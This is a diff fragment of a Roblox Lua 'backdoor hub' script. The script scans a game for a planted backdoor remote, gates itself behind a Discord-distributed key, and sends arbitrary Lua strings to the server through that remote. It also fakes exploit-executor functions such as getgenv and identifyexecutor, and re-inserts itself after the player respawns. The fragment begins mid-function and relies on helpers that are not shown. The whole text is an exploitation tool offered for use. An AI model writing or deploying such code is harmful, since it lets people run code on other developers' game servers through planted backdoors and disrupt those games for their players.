+		local r,f='',(b:find(x)-1)
+		for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+		return r;
+	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+		if (#x ~= 8) then return '' end
+		local c=0
+		for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+		return string.char(c)
+	end))
+end
+
+local env = {}
+local nil_instances = {}
+local required = {}
+local unlock_table
+
+local function newcclosure(func) 
+	return function(...)
+		return func(...)
+	end
+end
+
+local function printidentity()
+	print("Current Identify Is 2")
+end
+
+unlock_table = function(v)
+	local t = {}
+	for i, v in pairs(v) do
+		if type(v) == "table" then
+			t[i] = unlock_table(v)
+		elseif type(v) == "function" then
+			t[i] = newcclosure(v)
+		else
+			t[i] = v
+		end
+	end
+	return t
+end
+-- Normal Globals
+
+local function fake_loadstring(code : string)
+	return loadstring(code, env)
+end
+
+
+local function gethui()
+	return game.Players.LocalPlayer.PlayerGui
+end
+
+local function identifyexecutor()
+	return "CS BACKDOOR HUB"
+end
+
+local function getinstances()
+	return game:GetDescendants()
+end
+local function getnilinstances()
+	return nil_instances
+end
+
+local function getscripts()
+	local scripts = {}
+	for i, v in pairs(getinstances()) do
+		if v:IsA("LocalScript") or v:IsA("ModuleScript") then
+			table.insert(scripts, v)
+		end
+	end
+	for i, v in pairs(getnilinstances()) do
+		if v:IsA("LocalScript") or v:IsA("ModuleScript") then
+			table.insert(scripts, v)
+		end
+	end
+	return scripts
+end
+
+local crypt = {
+	base64 = {},
+}
+
+local function isreadonly(mt)
+	return not ({pcall(getmetatable, mt)})[1]
+end
+
+local function getrenv()
+	return getfenv(0)
+end
+
+local function debug_getinfo(f)
+	return {
+		source = debug.info(f, "s"),
+		what = "",
+		numparams = debug.info(f, "a")[1],	
+		currentline = debug.info(f, "l"),
+		is_vararg = 0,
+		name = debug.info(f, "n"),
+		func = debug.info(f, "f"),
+		nups = 0,
+		short_src = ""
+	}
+end
+
+local function getreg()
+	local reg = {}
+	local dump_table
+	dump_table = function(t)
+		for i, v in pairs(t) do
+			table.insert(reg, v)
+			if type(v) == "table" then
+				dump_table(v)
+			end
+		end
+	end
+	dump_table(env)
+	for i, v in pairs(env) do
+		if type(v) == "table" then
+			reg[i] = v
+		end
+	end
+	return reg
+end
+
+
+do
+	-- tables
+	env["math"] = math
+	env["table"] = table
+	env["string"] = string
+	env["debug"] = debug
+	env["Vector2"] = Vector2
+	env["Vector3"] = Vector3
+	env["CFrame"] = CFrame
+	env["UDim"] = UDim
+	env["UDim2"] = UDim2
+	env["workspace"] = workspace
+	env["Workspace"] = workspace
+	env["game"] = game
+	env["Game"] = game
+	env["Random"] = Random
+	env["Enum"] = Enum
+	env["Rect"] = Rect
+	env["Region3int16"] = Region3int16
+	env["Region3"] = Region3
+	env["Vector2int16"] = Vector2int16
+	env["Vector3int16"] = Vector3int16
+	env["RaycastParams"] = RaycastParams
+	env["Ray"] = Ray
+	env["RotationCurveKey"] = RotationCurveKey
+	env["TweenInfo"] = TweenInfo
+	env["task"] = task
+	env["utf8"] = utf8
+	env["Instance"] = Instance
+	env["os"] = os
+	env["OverlapParams"] = OverlapParams
+	env["plugin"] = plugin
+	env["DockWidgetPluginGuiInfo"] = DockWidgetPluginGuiInfo
+	env["PhysicalProperties"] = PhysicalProperties
+	env["PathWaypoint"] = PathWaypoint
+	env["Axes"] = Axes
+	env["shared"] = shared
+	env["DateTime"] = DateTime
+	env["File"] = File
+	env["Font"] = Font
+	env["Faces"] = Faces
+	env["FloatCurveKey"] = FloatCurveKey
+	env["Color3"] = Color3
+	env["ColorSequence"] = ColorSequence
+	env["ColorSequenceKeypoint"] = ColorSequenceKeypoint
+	env["BrickColor"] = BrickColor
+	env["NumberRange"] = NumberRange
+	env["NumberSequence"] = NumberSequence
+	env["NumberSequenceKeypoint"] = NumberSequenceKeypoint
+	env["_G"] = {}
+
+	-- functions
+	env["wait"] = wait
+	env["Wait"] = wait
+	env["delay"] = delay
+	env["Delay"] = delay
+	env["spawn"] = spawn
+	env["Spawn"] = spawn
+	env["pcall"] = pcall
+	env["xpcall"] = xpcall
+	env["ypcall"] = ypcall
+	env["print"] = print
+	env["warn"] = warn
+	env["error"] = error
+	env["elapsedTime"] = elapsedTime
+	env["ElapsedTime"] = elapsedTime
+	env["require"] = function(module : ModuleScript)
+		if module then
+			table.insert(required, module)
+		end
+		return require(module)
+	end
+	env["rawget"] = rawget
+	env["rawset"] = rawset
+	env["rawlen"] = rawlen
+	env["rawequal"] = rawequal
+	env["tostring"] = tostring
+	env["tonumber"] = tonumber
+	env["time"] = time
+	env["tick"] = tick
+	env["typeof"] = typeof
+	env["type"] = type
+	env["unpack"] = unpack
+	env["UserSettings"] = UserSettings
+	env["ipairs"] = ipairs
+	env["pairs"] = pairs
+	env["assert"] = assert
+	env["setmetatable"] = setmetatable
+	env["settings"] = settings
+	env["getfenv"] = getfenv
+	env["setfenv"] = setfenv
+	env["select"] = select
+	env["getmetatable"] = getmetatable
+	env["stats"] = stats
+	env["Stats"] = stats
+	env["gcinfo"] = gcinfo
+	env["collectgarbage"] = collectgarbage
+	env["version"] = version
+	env["Version"] = version
+	env["newproxy"] = newproxy
+	env["next"] = next
+
+	-- misc
+	env["script"] = Instance.new("LocalScript")
+	env["_VERSION"] = "LuaU"
+
+	env = unlock_table(env)
+end
+
+local function setclipboardfunc(str : string)
+	setclipboard(str)
+	create("Clipboard","Copy clipboard has been used")
+end
+
+local function getloadedmodules()
+	return required
+end
+
+do
+	env["gethui"] = gethui
+	env["getinstances"] = getinstances
+	env["getnilinstances"] = getnilinstances
+	env["getscripts"] = getscripts
+	env["newcclosure"] = newcclosure
+	env["crypt"] = crypt
+	env["isreadonly"] = isreadonly
+	env["printidentity"] = printidentity
+	env["identifyexecutor"] = identifyexecutor
+	env["getgenv"] = function()
+		return env 
+	end
+	env["loadstring"] = fake_loadstring
+	env["debug"] = unlock_table(env["debug"]) -- unlock debug to edit
+	env["debug"]["getinfo"] = debug_getinfo -- add function
+	env["debug"] = table.freeze(env["debug"]) -- lock again
+	env["bit"] = bit32
+	env["setclipboard"] = setclipboardfunc
+	env["getloadedmodules"] = getloadedmodules
+	env["getrenv"] = getrenv
+	env["getreg"] = getreg
+	env["cloneref"] = function(i)return(i)end
+end
+
+
+local function client_side_executor()
+	
+end
+
+local bindable = Instance.new("BindableFunction")
+bindable.OnInvoke = function(option)
+	if option == "Music Player" then
+		music_creator()
+	end
+end
+
+spawn(function()
+	loadstring("print(Hello World!", env)()
+end)
+
+-- create hub
+local function createHandler()
+	create("Made by FBlercheNF!", "wawa backdoor hub loadin' :3")
+	task.wait(2)
+	
+	create("Finding backdoor", "yeah wait a bit")
+	
+	task.wait(0.05)
+	
+	local is_found = find()
+	if is_found==false then
+		task.wait(1)		
+		create_withoptions("No Found", "Sorry! This place is not have backdoor. Sorry! \n (CLIENT SIDE) \n What you wanna open?",5,"Music Player","Client Side Executor",bindable)
+		return
+	end
+	
+	repeat
+		task.wait()
+	until is_found==true
+	
+	create("Found it!", "Thanks for waiting! Backdoor name in case: '".. r.Name.."'")
+
+	local verified = false
+	
+	local plrGui_ = Instance.new("ScreenGui",interface)
+	plrGui_.ResetOnSpawn = false
+	plrGui_.IgnoreGuiInset = true
+	plrGui_.Name = "SSBHLLOADER"
+	local find = game.Players.LocalPlayer:FindFirstChild("SBHVerified")
+	if not find then
+		task.wait(2)
+		create("Wait!", "key verification! :P")
+		local loading_frae = Instance.new("Frame",plrGui_)
+		loading_frae.Size = UDim2.new(.2,0,.2,0)
+		loading_frae.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+		loading_frae.BackgroundTransparency = 0.1
+		loading_frae.Visible = true
+		loading_frae.Position = UDim2.new(0.5,0,0.5,0)
+		loading_frae.AnchorPoint = Vector2.new(0.5,0.5)
+		loading_frae.Active = true
+		loading_frae.Draggable = true
+		closebutton(loading_frae,plrGui_,function()
+			create("Closin", "bay bay!")
+		end)
+
+		local key_redeemer = Instance.new("TextBox",loading_frae)
+
+		key_redeemer.BackgroundColor3 = Color3.fromRGB(10,10,10)
+		key_redeemer.BorderColor3 = Color3.fromRGB(255,255,255)
+		key_redeemer.TextColor3 = Color3.fromRGB(255, 255, 255)
+		key_redeemer.TextScaled = true
+		key_redeemer.PlaceholderText = "Enter Key"
+		key_redeemer.Text = ""
+		key_redeemer.BackgroundTransparency = 0.85
+		key_redeemer.Size = UDim2.new(0.3,0,0.3,0)
+		key_redeemer.Position = UDim2.new(0.2,0,.5,0)
+		key_redeemer.AnchorPoint = Vector2.new(0.5,0.5)
+
+		local imagelabel = Instance.new("ImageLabel",loading_frae)
+		imagelabel.Size = UDim2.new(1,0,1,0)
+		imagelabel.BackgroundTransparency = 1
+		imagelabel.Image = "rbxassetid://74595603256262"
+		imagelabel.ImageColor3 = Color3.fromRGB(255,255,255)
+		imagelabel.AnchorPoint = Vector2.new(0.5,0.5)
+		imagelabel.Position = UDim2.new(0.5,0,0.5,0)
+		imagelabel.ScaleType = Enum.ScaleType.Fit
+		imagelabel.ImageTransparency = 0.75
+
+		game["Run Service"].RenderStepped:Connect(function()
+			imagelabel.Rotation += 0.1
+		end)	
+
+		local link = Instance.new("TextButton",loading_frae)
+		link.BackgroundTransparency = 0.85
+		link.Text = "Link: 'https://discord.gg/C8shJzycQd' for key!"
+		link.BackgroundColor3 = Color3.fromRGB(10,10,10)
+		link.Size = UDim2.new(0.65,0,1,0)
+		link.TextScaled = true
+		--	link.TextEditable = false
+		--	link.ClearTextOnFocus = false
+		link.TextColor3 = Color3.fromRGB(255,255,255)
+		link.Position = UDim2.new(0.7,0,.5,0)
+		link.AnchorPoint = Vector2.new(0.5,0.5)
+
+		link.MouseButton1Click:Connect(function()
+			create("Link has been copied","ctrl+v to paste for bun ppl")
+			setclipboard("https://discord.gg/C8shJzycQd")
+		end)	
+
+		key_redeemer.FocusLost:Connect(function(enterPressed)
+			if enterPressed then
+				local key = key_redeemer.Text
+				if key == from_base64("c3Bhd24=") then
+					verified = true
+					create("Key Verified!", "^_^")
+
+					local injected = Instance.new("BoolValue",game.Players.LocalPlayer)
+					injected.Name="SBHVerified"
+
+					loading_frae:Destroy()
+				else
+					create("Key Invalid!", "X_X")
+				end
+			end
+		end)
+	else
+		create("Verified", "You're already verified!")
+		verified = true
+	end
+
+	repeat
+		task.wait()
+	until verified == true
+	create("Loadin!", "hold on!11")
+--	r:InvokeServer("Instance.new('BoolValue',game.Players.".. game.Players.LocalPlayer.Name ..").Name = 'SS_BHInjected'")
+	task.wait(2.5)
+	local frame = Instance.new("Frame",plrGui_)
+	frame.Size = UDim2.new(0.1,0,0.25,0)
+	frame.BackgroundColor3 = Color3.fromRGB(45,45,45)
+	frame.Position = UDim2.new(0.5,0,0.5,0)
+	frame.AnchorPoint = Vector2.new(0.5,0.5)
+	frame.Active = true
+	frame.Draggable = true
+	frame.Name = "Skibbity"
+
+	frame.ClipsDescendants=false
+
+	local imagelabel = Instance.new("ImageLabel",frame)
+	imagelabel.Size = UDim2.new(1,0,1,0)
+	imagelabel.BackgroundTransparency = 1
+	imagelabel.Image = "rbxassetid://74595603256262"
+	imagelabel.ImageColor3 = Color3.fromRGB(255,255,255)
+	imagelabel.AnchorPoint = Vector2.new(0.5,0.5)
+	imagelabel.Position = UDim2.new(0.5,0,0.5,0)
+	imagelabel.ScaleType = Enum.ScaleType.Fit
+	imagelabel.ImageTransparency = 0.75
+
+	game["Run Service"].RenderStepped:Connect(function(d)
+		imagelabel.Rotation += 0.15
+	end)
+
+	hidebutton(frame,function()
+		openbutton("Backdoor Hub",frame)
+	end)
+
+	closebutton(frame,plrGui_,function()
+		create("Closin hub", "wawa hub will wait for you!")
+	end)
+
+	local scrollingframe = Instance.new("ScrollingFrame",frame)
+	scrollingframe.Size = UDim2.new(1,0,1,0)
+	scrollingframe.BackgroundTransparency = 1
+	scrollingframe.CanvasSize = UDim2.new(0,0,0,0)
+	scrollingframe.ScrollBarThickness = 2
+	scrollingframe.ScrollBarImageColor3 = Color3.fromRGB(255,255,255)
+
+	local buttons = {"Inject","Reset","Music player"}
+
+	for i,v in pairs(buttons) do
+		local temp = Instance.new("TextButton",scrollingframe)
+		temp.Size = UDim2.new(1,0,0.025,0)
+		temp.BackgroundColor3 = Color3.fromRGB(55,55,55)
+		temp.TextColor3 = Color3.fromRGB(255,255,255)
+		temp.TextTransparency = 0.65
+		temp.TextXAlignment = Enum.TextXAlignment.Left
+		temp.TextYAlignment = Enum.TextYAlignment.Top
+		temp.Text = v
+		temp.TextSize = 20
+		temp.TextWrapped = true
+		temp.AutomaticSize = Enum.AutomaticSize.Y
+		temp.MouseButton1Click:Connect(function()
+			if temp.Text == "Reset" then
+				remove()
+				r:InvokeServer("game.Players."..game.Players.LocalPlayer.Name..":LoadCharacter()")				
+			elseif temp.Text == "Inject" then
+				gui_create()
+			elseif temp.Text == "Music player" then
+				music_creator()
+			end
+		end)
+	end
+
+	local uilist = 	Instance.new("UIListLayout",scrollingframe)
+	uilist.Padding = UDim.new(0,3)
+	scrollingframe.CanvasSize = UDim2.new(0,0,0,scrollingframe.UIListLayout.AbsoluteContentSize.Y)
+
+end
+
+createHandler()
+
+if script:IsA("LocalScript") then
+	script.Parent = game.Players.LocalPlayer.PlayerGui:WaitForChild("SSBHLLOADER").Skibbity
+end
+
+function remove()
+	create("Sorry!", "Im have to delete everything due 'some bug' D:")
+	for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
+		if v.Name == "SSBHLLOADER" or v.Name == "SBPlayer" or v.Name == "HidedHub" then
+			v:Destroy()
+		end
+	end
+
+	music_alpha:Destroy()
+end
+
+local skibbity = false
+game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Died:Connect(function()
+	skibbity = true
+end)
+
+game.Players.LocalPlayer.CharacterAdded:Connect(function()
+	if skibbity==true then
+		remove()
+		if script:IsA("LocalScript") then
+			script:Clone().Parent = game.Players.LocalPlayer.PlayerGui
+		end
+		
+		skibbity = false
+	end
+end)
